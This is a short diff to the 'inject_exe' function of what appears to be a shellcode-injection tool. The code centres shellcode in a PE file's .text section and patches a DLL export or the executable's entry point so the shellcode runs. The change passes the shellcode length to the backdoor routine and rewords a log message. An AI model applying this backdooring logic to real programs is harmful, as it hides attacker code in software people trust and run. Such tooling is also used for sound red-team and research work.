@@ -73,6 +73,7 @@ def inject_exe(
         shellcode_offset = int((sect_size - shellcode_len) / 2)  # centered in the .text section
         shellcode_offset += sect.PointerToRawData
         shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)
+
         logger.info("--( Inject: Shellcode rva:0x{:X} (from offset:0x{:X})".format(
             shellcode_rva, shellcode_offset))
 
@@ -91,7 +92,7 @@ def inject_exe(
                 addr = superpe.getExportEntryPoint(settings.dllfunc)
                 logger.info("--( Inject DLL: Patch {} (0x{:X})".format(
                     settings.dllfunc, addr))
-                function_backdoorer.backdoor_function(addr, shellcode_rva)
+                function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
         else: # EXE
             logger.info("---( Rewire: EXE")
@@ -103,9 +104,9 @@ def inject_exe(
 
             elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                 addr = superpe.get_entrypoint()
-                logger.info("--( Inject EXE: Patch main() (0x{:X})".format(
+                logger.info("--( Inject EXE: Patch from entrypoint (0x{:X})".format(
                     addr))
-                function_backdoorer.backdoor_function(addr, shellcode_rva)
+                function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
         if source_style == FunctionInvokeStyle.iat_reuse:
             injected_fix_iat(superpe, project.carrier, project.exe_host)
